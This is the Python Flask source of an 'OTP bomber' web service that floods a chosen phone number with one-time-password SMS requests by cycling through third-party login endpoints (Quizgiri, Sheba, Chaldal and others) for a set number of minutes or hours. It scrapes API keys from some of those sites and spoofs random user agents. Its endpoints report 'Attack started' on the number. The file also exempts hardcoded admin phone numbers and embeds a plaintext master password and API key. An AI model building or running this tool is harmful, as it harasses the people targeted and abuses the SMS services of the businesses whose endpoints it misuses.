from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import threading
import time
import json
import requests
import random
import string
import re
from urllib.parse import urlencode
from datetime import datetime

import database as db

app = Flask(__name__)
CORS(app)

# Server start time for uptime tracking
SERVER_START_TIME = time.time()

# Configuration
CONFIG_FILE = 'otp.json'
ADMIN_NUMBERS = ["01882030873", "01518931383"]
MASTER_PASSWORD = "alit"  # Master password to stop any job
API_KEY = "boomber123"  # API Key for GET requests

# Active jobs tracker
active_jobs = {}  # job_id -> {'thread': thread, 'stop_flag': Event}

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def load_config():
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading config: {e}")
        return {"targets": []}

def get_random_ua():
    return random.choice(USER_AGENTS)

def get_random_request_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def prepare_target(target):
    if target.get('name') == "Quizgiri":
        try:
            res = requests.get("https://app.quizgiri.com.bd/", timeout=5)
            match = re.search(r'x-api-key\s*=\s*"(.+?)"', res.text)
            if match:
                if 'headers' not in target:
                    target['headers'] = {}
                target['headers']["x-api-key"] = match.group(1)
        except:
            pass
    
    elif target.get('name') == "Sheba":
        try:
            token_endpoint = target.get('tokenEndpoint')
            if token_endpoint:
                res = requests.get(token_endpoint, timeout=5)
                token_data = res.json()
                if 'token' in token_data:
                    target['_fetched_token'] = token_data['token']
        except:
            pass

def replace_number_in_obj(obj, number):
    if isinstance(obj, dict):
        return {k: replace_number_in_obj(v, number) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [replace_number_in_obj(i, number) for i in obj]
    elif isinstance(obj, str):
        return obj.replace("__NUMBER__", number)
    return obj

def send_single_request(target, phone, job_id):
    """Send a single request to a target API and log the result"""
    try:
        prepare_target(target)
        
        name = target.get('name', 'Unknown')
        method = target.get('type', 'GET').upper()
        base_url = target.get('base', '')
        route = target.get('route', '')
        headers = target.get('headers', {}).copy()
        
        headers['User-Agent'] = get_random_ua()
        headers['x-request-id'] = get_random_request_id()
        
        response = None
        
        # Special Case: Chaldal
        if name == "Chaldal":
            query_params_template = target.get('queryParamsTemplate', {})
            query_params = {}
            for k, v in query_params_template.items():
                query_params[k] = v.replace("__NUMBER__", phone)
            url = f"{base_url}?{urlencode(query_params)}"
            response = requests.post(url, headers=headers, json={}, timeout=10)
        else:
            url = base_url + route
            
            if method == 'GET':
                query_param = target.get('queryParam')
                if query_param:
                    params = {query_param: phone}
                    response = requests.get(url, headers=headers, params=params, timeout=10)
                elif 'queryParam' in target and target['queryParam'] is None:
                    url = f"{url}{phone}"
                    response = requests.get(url, headers=headers, timeout=10)
                else:
                    response = requests.get(url, headers=headers, timeout=10)
            
            elif method == 'POST':
                body_template = target.get('bodyTemplate', {})
                json_body = replace_number_in_obj(body_template, phone)
                
                if name == "Sheba" and '_fetched_token' in target:
                    json_body = json.loads(json.dumps(json_body).replace("__API_TOKEN__", target['_fetched_token']))
                
                content_type = headers.get('Content-Type', 'application/json')
                
                if 'application/x-www-form-urlencoded' in content_type:
                    response = requests.post(url, headers=headers, data=json_body, timeout=10)
                elif 'multipart/form-data' in content_type:
                    if 'Content-Type' in headers:
                        del headers['Content-Type']
                    files_data = {k: (None, str(v)) for k, v in json_body.items()}
                    response = requests.post(url, headers=headers, files=files_data, timeout=10)
                else:
                    response = requests.post(url, headers=headers, json=json_body, timeout=10)
        
        if response:
            success = response.status_code in [200, 201, 202]
            db.log_api_result(job_id, name, success, response.status_code)
            return success, response.status_code
        
        return False, None
    
    except Exception as e:
        db.log_api_result(job_id, target.get('name', 'Unknown'), False, None)
        return False, None

def run_bombing_job(job_id, phone, duration_minutes, stop_flag):
    """Background thread function to run bombing job based on duration"""
    config = load_config()
    targets = config.get('targets', [])
    
    if phone in ADMIN_NUMBERS:
        db.complete_job(job_id, 'protected')
        return
    
    total_success = 0
    total_fail = 0
    round_num = 0
    
    # Calculate end time based on duration
    end_time = time.time() + (duration_minutes * 60)
    
    while time.time() < end_time and not stop_flag.is_set():
        round_num += 1
        
        for target in targets:
            if stop_flag.is_set() or time.time() >= end_time:
                break
            
            success, status = send_single_request(target, phone, job_id)
            if success:
                total_success += 1
            else:
                total_fail += 1
            
            time.sleep(0.5)
        
        # Update progress after each round
        db.update_job_progress(job_id, round_num, total_success, total_fail)
        
        # Small delay between rounds
        time.sleep(1)
    
    # Update daily stats
    db.update_daily_stats(total_success, total_fail)
    
    # Complete job
    if stop_flag.is_set():
        db.complete_job(job_id, 'stopped')
    else:
        db.complete_job(job_id, 'completed')
    
    # Cleanup
    if job_id in active_jobs:
        del active_jobs[job_id]

# Routes
@app.route('/')
def index():
    # Log visitor and get count
    visitor_ip = request.remote_addr
    # Handle proxy headers if needed (e.g., X-Forwarded-For)
    if request.headers.getlist("X-Forwarded-For"):
        visitor_ip = request.headers.getlist("X-Forwarded-For")[0]
        
    db.log_visitor(visitor_ip)
    return render_template('index.html')

@app.route('/api/stats')
def get_stats():
    today_stats = db.get_today_stats()
    running_jobs = db.get_running_jobs()
    all_jobs = db.get_all_jobs()
    config = load_config()
    
    # Calculate uptime
    uptime_seconds = int(time.time() - SERVER_START_TIME)
    hours = uptime_seconds // 3600
    minutes = (uptime_seconds % 3600) // 60
    uptime_str = f"{hours}h {minutes}m" if hours > 0 else f"{minutes}m"
    
    # Get visitor count (using localhost IP for now as we don't pass it here, 
    # but log_visitor returns total count anyway if we just query it)
    # Actually, let's just query the count directly or use the last logged value.
    # A better way is to add a get_visitor_count() to db, but log_visitor returns it.
    # Let's just call log_visitor with a dummy or current IP to get the count, 
    # OR better, add get_visitor_count to db.
    # For now, let's just use log_visitor with the current IP to ensure it's up to date.
    visitor_ip = request.remote_addr
    if request.headers.getlist("X-Forwarded-For"):
        visitor_ip = request.headers.getlist("X-Forwarded-For")[0]
    total_visitors = db.log_visitor(visitor_ip)
    
    return jsonify({
        'total_sent_today': today_stats['total_sent'],
        'total_success_today': today_stats['total_success'],
        'total_fail_today': today_stats['total_fail'],
        'running_jobs': len(running_jobs),
        'total_apis': len(config.get('targets', [])),
        'total_jobs': len(all_jobs),
        'total_visitors': total_visitors,
        'uptime': uptime_str
    })

@app.route('/api/jobs')
def get_jobs():
    jobs = db.get_all_jobs()
    # Calculate time remaining for running jobs
    for job in jobs:
        if job['status'] == 'running':
            start = datetime.fromisoformat(job['start_time'])
            elapsed = (datetime.now() - start).total_seconds()
            # Duration is stored as total_rounds (but it's actually minutes)
            total_seconds = job['total_rounds'] * 60
            remaining = max(0, total_seconds - elapsed)
            job['time_remaining'] = int(remaining)
        else:
            job['time_remaining'] = 0
    return jsonify(jobs)

@app.route('/api/jobs', methods=['POST'])
def create_job():
    data = request.json
    phone = data.get('phone', '').strip()
    added_by = data.get('added_by', 'Anonymous').strip()
    password = data.get('password', '').strip()
    duration_minutes = int(data.get('duration_minutes', 5))
    
    if not phone:
        return jsonify({'error': 'Phone number required'}), 400
    
    if not password:
        return jsonify({'error': 'Password required'}), 400
    
    if phone in ADMIN_NUMBERS:
        return jsonify({'error': 'This number is protected'}), 403
    
    # Create job in database (using total_rounds to store duration_minutes)
    job_id = db.create_job(phone, added_by, password, duration_minutes)
    
    # Start background thread
    stop_flag = threading.Event()
    thread = threading.Thread(
        target=run_bombing_job,
        args=(job_id, phone, duration_minutes, stop_flag),
        daemon=True
    )
    
    active_jobs[job_id] = {
        'thread': thread,
        'stop_flag': stop_flag
    }
    
    thread.start()
    
    return jsonify({'success': True, 'job_id': job_id})

@app.route('/api/jobs/<int:job_id>', methods=['DELETE'])
def stop_job(job_id):
    data = request.json or {}
    password = data.get('password', '')
    
    job = db.get_job(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    
    # Check password
    if password != job['password'] and password != MASTER_PASSWORD:
        return jsonify({'error': 'Wrong password'}), 403
    
    # Stop the job
    if job_id in active_jobs:
        active_jobs[job_id]['stop_flag'].set()
    else:
        # Job might have already finished
        if job['status'] == 'running':
            db.complete_job(job_id, 'stopped')
    
    return jsonify({'success': True})

@app.route('/api/jobs/<int:job_id>/logs')
def get_job_logs(job_id):
    logs = db.get_job_logs(job_id)
    return jsonify(logs)

@app.route('/api/targets')
def get_targets():
    config = load_config()
    targets = [{'name': t['name'], 'type': t['type']} for t in config.get('targets', [])]
    return jsonify(targets)

@app.route('/start', methods=['GET'])
def start_job_api():
    numbar = request.args.get('numbar')
    apikey = request.args.get('apikey')
    time_hours = request.args.get('time')
    
    if not numbar or not apikey or not time_hours:
        return jsonify({'error': 'Missing parameters: numbar, apikey, time'}), 400
        
    if apikey != API_KEY:
        return jsonify({'error': 'Invalid API Key'}), 403
        
    if numbar in ADMIN_NUMBERS:
        return jsonify({'error': 'This number is protected'}), 403
        
    try:
        duration_minutes = int(float(time_hours) * 60)
    except ValueError:
        return jsonify({'error': 'Invalid time format'}), 400
        
    # Create job
    job_id = db.create_job(numbar, 'API User', 'api_started', duration_minutes)
    
    # Start background thread
    stop_flag = threading.Event()
    thread = threading.Thread(
        target=run_bombing_job,
        args=(job_id, numbar, duration_minutes, stop_flag),
        daemon=True
    )
    
    active_jobs[job_id] = {
        'thread': thread,
        'stop_flag': stop_flag
    }
    
    thread.start()
    
    return jsonify({
        'success': True, 
        'message': f'Attack started on {numbar} for {time_hours} hours',
        'job_id': job_id
    })

@app.route('/stop', methods=['GET'])
def stop_job_api():
    numbar = request.args.get('numbar')
    apikey = request.args.get('apikey')
    
    if not numbar or not apikey:
        return jsonify({'error': 'Missing parameters: numbar, apikey'}), 400
        
    if apikey != API_KEY:
        return jsonify({'error': 'Invalid API Key'}), 403
        
    # Find running job for this number
    running_jobs = db.get_running_jobs()
    target_job = None
    for job in running_jobs:
        if job['phone'] == numbar:
            target_job = job
            break
            
    if not target_job:
        return jsonify({'error': 'No running job found for this number'}), 404
        
    job_id = target_job['id']
    
    # Stop the job
    if job_id in active_jobs:
        active_jobs[job_id]['stop_flag'].set()
    else:
        # Job might be in DB as running but not in memory (restart case)
        db.complete_job(job_id, 'stopped')
        
    return jsonify({'success': True, 'message': f'Attack stopped for {numbar}'})

if __name__ == '__main__':
    print("\n" + "="*50)
    print("   💥 BOOMBER WEB UI BY ALIT")
    print("="*50)
    print(f"   🔑 Master Password: {MASTER_PASSWORD}")
    print(f"   🌐 Open: http://localhost:5000")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
